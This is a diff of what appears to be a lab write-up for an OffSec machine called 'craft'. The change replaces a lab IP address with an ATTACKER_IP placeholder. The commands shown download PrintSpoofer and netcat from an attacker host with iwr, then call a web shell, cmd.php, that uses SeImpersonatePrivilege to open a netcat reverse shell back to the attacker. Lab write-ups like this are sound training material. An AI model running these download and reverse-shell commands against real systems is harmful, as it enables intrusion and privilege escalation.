@@ -319,9 +319,9 @@ The apache account possessed `SeImpersonatePrivilege`, making token impersonatio
 Commands
 
 ```
-iwr http://192.168.45.180/PrintSpoofer64.exe -o C:\xampp\htdocs\PrintSpoofer64.exe
+iwr http://ATTACKER_IP/PrintSpoofer64.exe -o C:\xampp\htdocs\PrintSpoofer64.exe
 
-iwr http://192.168.45.180/nc64.exe -o C:\xampp\htdocs\nc64.exe
+iwr http://ATTACKER_IP/nc64.exe -o C:\xampp\htdocs\nc64.exe
 ```
 
 Interpretation
@@ -335,7 +335,7 @@ A reverse shell was executed using PrintSpoofer.
 URL
 
 ```
-http://craft.offsec/cmd.php?cmd=C:\xampp\htdocs\PrintSpoofer64.exe -c "C:\xampp\htdocs\nc64.exe 192.168.45.180 443 -e cmd"
+http://craft.offsec/cmd.php?cmd=C:\xampp\htdocs\PrintSpoofer64.exe -c "C:\xampp\htdocs\nc64.exe ATTACKER_IP 443 -e cmd"
 ```
 
 Listener
